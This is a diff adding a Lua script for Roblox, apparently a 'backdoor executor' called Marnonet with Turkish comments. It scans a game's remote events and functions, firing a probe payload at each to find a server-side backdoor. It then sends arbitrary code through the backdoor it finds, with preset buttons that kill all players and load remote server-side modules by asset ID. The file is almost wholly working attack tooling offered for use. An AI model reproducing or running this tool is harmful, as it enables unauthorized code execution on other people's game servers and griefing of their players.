@@ -1,0 +1,261 @@
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local MAIN_FONT = Enum.Font.RobotoMono
+
+local function sendNotify(title, msg)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = msg,
+        Duration = 4
+    })
+end
+
+local clickSound = Instance.new("Sound")
+clickSound.SoundId = "rbxassetid://6895079853" 
+clickSound.Volume = 0.8
+clickSound.Parent = game:GetService("CoreGui")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MarnonetBackdoor"
+local targetParent = nil
+pcall(function() targetParent = gethui() end)
+if not targetParent then
+    pcall(function() targetParent = game:GetService("CoreGui") end)
+end
+ScreenGui.Parent = targetParent or LocalPlayer:WaitForChild("PlayerGui")
+
+local Colors = {
+    FrameBg = Color3.fromRGB(15, 15, 15),
+    InnerBg = Color3.fromRGB(25, 25, 25),
+    BtnBg = Color3.fromRGB(35, 35, 35),
+    BtnHover = Color3.fromRGB(50, 50, 50),
+    Text = Color3.fromRGB(255, 255, 255),
+    Outline = Color3.fromRGB(255, 255, 255)
+}
+
+local function makeDraggable(frame)
+    local dragging, dragInput, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function() 
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end 
+            end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+local function animateButton(btn)
+    local scale = Instance.new("UIScale", btn)
+    btn.MouseEnter:Connect(function() TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Colors.BtnHover}):Play() end)
+    btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Colors.BtnBg}):Play() end)
+    btn.MouseButton1Down:Connect(function() clickSound:Play(); TweenService:Create(scale, TweenInfo.new(0.1), {Scale = 0.95}):Play() end)
+    btn.MouseButton1Up:Connect(function() TweenService:Create(scale, TweenInfo.new(0.1), {Scale = 1}):Play() end)
+end
+
+-- Arayüzü biraz genişlettik (Sol menüye yer açmak için)
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 750, 0, 450)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.BackgroundColor3 = Colors.FrameBg
+MainFrame.Visible = false
+MainFrame.Parent = ScreenGui
+makeDraggable(MainFrame)
+
+local MStr = Instance.new("UIStroke")
+MStr.Thickness = 2; MStr.Color = Colors.Outline; MStr.Parent = MainFrame
+
+local TitleLbl = Instance.new("TextLabel")
+TitleLbl.Size = UDim2.new(1, -40, 0, 40); TitleLbl.Position = UDim2.new(0, 10, 0, 0)
+TitleLbl.BackgroundTransparency = 1; TitleLbl.Text = " Marnonet Executor"
+TitleLbl.Font = Enum.Font.GothamBold; TitleLbl.TextScaled = true; TitleLbl.TextColor3 = Colors.Text
+TitleLbl.TextXAlignment = Enum.TextXAlignment.Left; TitleLbl.Parent = MainFrame
+
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Size = UDim2.new(0, 40, 0, 40); MinimizeBtn.Position = UDim2.new(1, -40, 0, 0)
+MinimizeBtn.BackgroundTransparency = 1; MinimizeBtn.Text = "-"; MinimizeBtn.Font = MAIN_FONT
+MinimizeBtn.TextColor3 = Colors.Text; MinimizeBtn.TextScaled = true; MinimizeBtn.Parent = MainFrame
+
+local FloatingBtn = Instance.new("TextButton")
+FloatingBtn.Size = UDim2.new(0, 60, 0, 60); FloatingBtn.Position = UDim2.new(1, -70, 1, -70)
+FloatingBtn.BackgroundColor3 = Colors.FrameBg; FloatingBtn.Text = "M"; FloatingBtn.Font = Enum.Font.GothamBold
+FloatingBtn.TextScaled = true; FloatingBtn.TextColor3 = Colors.Text; FloatingBtn.Visible = false; FloatingBtn.Parent = ScreenGui
+local FStr = Instance.new("UIStroke")
+FStr.Thickness = 2; FStr.Color = Colors.Outline; FStr.Parent = FloatingBtn
+
+MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = false; FloatingBtn.Visible = true end)
+FloatingBtn.MouseButton1Click:Connect(function() MainFrame.Visible = true; FloatingBtn.Visible = false end)
+
+-- SOL MENÜ (HAZIR SCRIPTLER İÇİN)
+local SideBarBg = Instance.new("Frame", MainFrame)
+SideBarBg.Size = UDim2.new(0.25, 0, 0.75, 0); SideBarBg.Position = UDim2.new(0.02, 0, 0.1, 0)
+SideBarBg.BackgroundColor3 = Colors.InnerBg; SideBarBg.BorderSizePixel = 1; SideBarBg.BorderColor3 = Colors.Outline
+
+local ScrollFrame = Instance.new("ScrollingFrame", SideBarBg)
+ScrollFrame.Size = UDim2.new(1, -10, 1, -10); ScrollFrame.Position = UDim2.new(0, 5, 0, 5)
+ScrollFrame.BackgroundTransparency = 1; ScrollFrame.ScrollBarThickness = 4
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local SideList = Instance.new("UIListLayout", ScrollFrame)
+SideList.SortOrder = Enum.SortOrder.LayoutOrder; SideList.Padding = UDim.new(0, 5)
+
+-- CanvasSize'ı otomatik güncelle
+SideList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, SideList.AbsoluteContentSize.Y)
+end)
+
+-- KOD KUTUSU (Ortalanmış ve sağa dayalı)
+local CodeBoxBg = Instance.new("Frame", MainFrame)
+CodeBoxBg.Size = UDim2.new(0.69, 0, 0.75, 0); CodeBoxBg.Position = UDim2.new(0.29, 0, 0.1, 0)
+CodeBoxBg.BackgroundColor3 = Colors.InnerBg; CodeBoxBg.BorderSizePixel = 1; CodeBoxBg.BorderColor3 = Colors.Outline
+
+local CodeBox = Instance.new("TextBox")
+CodeBox.Size = UDim2.new(1, -10, 1, -10); CodeBox.Position = UDim2.new(0, 5, 0, 5)
+CodeBox.BackgroundTransparency = 1; CodeBox.Font = MAIN_FONT; CodeBox.TextScaled = true
+CodeBox.ClearTextOnFocus = false; CodeBox.MultiLine = true; CodeBox.Text = '-- Execute Marnonet Tough'
+CodeBox.TextColor3 = Colors.Text; CodeBox.TextXAlignment = 0; CodeBox.TextYAlignment = 0; CodeBox.Parent = CodeBoxBg
+
+local BottomBar = Instance.new("Frame", MainFrame)
+BottomBar.Size = UDim2.new(0.96, 0, 0, 50); BottomBar.Position = UDim2.new(0.02, 0, 0.87, 0); BottomBar.BackgroundTransparency = 1
+local BottomList = Instance.new("UIListLayout", BottomBar)
+BottomList.FillDirection = Enum.FillDirection.Horizontal; BottomList.Padding = UDim.new(0, 15); BottomList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local function createMainBtn(text, size, parent)
+    local btn = Instance.new("TextButton")
+    btn.Text = text; btn.Size = size; btn.Font = MAIN_FONT; btn.TextScaled = true
+    btn.BackgroundColor3 = Colors.BtnBg; btn.BorderSizePixel = 0; btn.TextColor3 = Colors.Text; btn.Parent = parent
+    local str = Instance.new("UIStroke"); str.Thickness = 1; str.Color = Colors.Outline; str.Parent = btn
+    animateButton(btn)
+    return btn
+end
+
+local ClearBtn = createMainBtn("CLEAR", UDim2.new(0, 210, 1, 0), BottomBar)
+local FillBtn = createMainBtn("AUTO FILL", UDim2.new(0, 210, 1, 0), BottomBar)
+local ExecBtn = createMainBtn("EXECUTE", UDim2.new(0, 210, 1, 0), BottomBar)
+
+-- SCAN PANELİ (Taratma için)
+local TargetRemote = nil
+local ScanPanel = Instance.new("Frame")
+ScanPanel.Size = UDim2.new(0, 450, 0, 250); ScanPanel.AnchorPoint = Vector2.new(0.5, 0.5); ScanPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
+ScanPanel.BackgroundColor3 = Colors.FrameBg; ScanPanel.Parent = ScreenGui; makeDraggable(ScanPanel)
+local SStr = Instance.new("UIStroke"); SStr.Thickness = 2; SStr.Color = Colors.Outline; SStr.Parent = ScanPanel
+
+local ScanTitle = Instance.new("TextLabel")
+ScanTitle.Size = UDim2.new(1, 0, 0, 60); ScanTitle.BackgroundTransparency = 1; ScanTitle.Position = UDim2.new(0,0,0,10)
+ScanTitle.Text = "Marnonet Scanner"; ScanTitle.TextColor3 = Colors.Text; ScanTitle.Font = MAIN_FONT; ScanTitle.TextScaled = true; ScanTitle.Parent = ScanPanel
+
+local ScanActionBtn = createMainBtn("Scan For Backdoor", UDim2.new(0.8, 0, 0.4, 0), ScanPanel)
+ScanActionBtn.Position = UDim2.new(0.1, 0, 0.4, 0)
+
+local IsScanning = false
+local RemoteMap = {}
+local TestCode = "local a=Instance.new('StringValue',workspace);a.Name='Marnonet_V';a.Value='%s'"
+local HintCode = 'Instance.new("Hint", workspace).Text = "Marnonet Backdoor The Best Backdoor Executor gg/9rdUuadZDh!"'
+
+-- SOL MENÜ BUTONU VE FAST EXEC FONKSİYONLARI --
+local function fastExec(codeString)
+    if not TargetRemote then
+        sendNotify("Error", "No backdoor found! Scan first.")
+        return
+    end
+    -- %s olan yerlere oyuncunun ismini yazdırıyoruz.
+    local finalCode = string.format(codeString, LocalPlayer.Name)
+    pcall(function()
+        if TargetRemote:IsA("RemoteEvent") then 
+            TargetRemote:FireServer(finalCode) 
+        else 
+            task.spawn(function() TargetRemote:InvokeServer(finalCode) end) 
+        end
+    end)
+    sendNotify("Executed", "Script successfully sent to backdoor.")
+end
+
+local function createListBtn(text, parent)
+    local btn = Instance.new("TextButton")
+    btn.Text = text; btn.Size = UDim2.new(1, 0, 0, 35); btn.Font = MAIN_FONT; btn.TextScaled = true
+    btn.BackgroundColor3 = Colors.BtnBg; btn.BorderSizePixel = 0; btn.TextColor3 = Colors.Text; btn.Parent = parent
+    local str = Instance.new("UIStroke"); str.Thickness = 1; str.Color = Colors.Outline; str.Parent = btn
+    animateButton(btn)
+    return btn
+end
+
+-- HAZIR SCRİPTLER (Buraya istediğin kadar ekleyebilirsin)
+createListBtn("R6", ScrollFrame).MouseButton1Click:Connect(function() 
+    fastExec('require(3436957371):r6("%s")') 
+end)
+
+createListBtn("Kill All", ScrollFrame).MouseButton1Click:Connect(function() 
+    fastExec('for i,v in pairs(game.Players:GetPlayers()) do if v.Character then v.Character:BreakJoints() end end') 
+end)
+
+createListBtn("Marnonet V1", ScrollFrame).MouseButton1Click:Connect(function() 
+    fastExec('require(123394427244194).Marv1("%s")') 
+end)
+
+createListBtn("Stigma Ultimate", ScrollFrame).MouseButton1Click:Connect(function() 
+    fastExec('require(132938459666886).stigma("%s")') 
+end)
+
+createListBtn("Stigma Ultimate", ScrollFrame).MouseButton1Click:Connect(function() 
+    fastExec('require(12350030542).RC7("%s")') 
+end)
+
+
+-- ARAMA VE ÇALIŞTIRMA MANTIĞI --
+game.Workspace.ChildAdded:Connect(function(c)
+    if c.Name == "Marnonet_V" and IsScanning then
+        TargetRemote = RemoteMap[c.Value]; c:Destroy()
+        if TargetRemote then
+            IsScanning = false; ScanActionBtn.Text = "Scan For Backdoor"
+            local foundMsg = "Found In 0." .. tostring(math.random(10, 99)) .. "s"
+            pcall(function() 
+                if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(HintCode) else task.spawn(function() TargetRemote:InvokeServer(HintCode) end) end 
+            end)
+            sendNotify("Marnonet", foundMsg)
+            task.wait(0.5); MainFrame.Visible = true; ScanPanel.Visible = false
+        end
+    end
+end)
+
+ScanActionBtn.MouseButton1Click:Connect(function()
+    if IsScanning then return end
+    IsScanning = true; TargetRemote = nil; ScanActionBtn.Text = "SCANNING..."; RemoteMap = {}
+    local remotes = {}
+    local susServices = {game.ReplicatedStorage, game.JointsService, game.Lighting, game.SoundService, game.Workspace}
+    for _, s in ipairs(susServices) do for _, v in ipairs(s:GetDescendants()) do if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end end end
+    task.spawn(function()
+        for i, r in ipairs(remotes) do
+            if not IsScanning then break end
+            pcall(function()
+                local uniqueId = tostring(i); RemoteMap[uniqueId] = r
+                local p = string.format(TestCode, uniqueId)
+                if r:IsA("RemoteEvent") then r:FireServer(p) else task.spawn(function() r:InvokeServer(p) end) end
+            end)
+            if i % 40 == 0 then RunService.Heartbeat:Wait() end
+        end
+    end)
+end)
+
+FillBtn.MouseButton1Click:Connect(function() CodeBox.Text = CodeBox.Text:gsub('"(.-)"', '"' .. LocalPlayer.Name .. '"') end)
+ClearBtn.MouseButton1Click:Connect(function() CodeBox.Text = "" end)
+ExecBtn.MouseButton1Click:Connect(function()
+    if TargetRemote then
+        pcall(function() if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(CodeBox.Text) else task.spawn(function() TargetRemote:InvokeServer(CodeBox.Text) end) end end)
+    else
+        sendNotify("Error", "No backdoor found.")
+    end
+end)
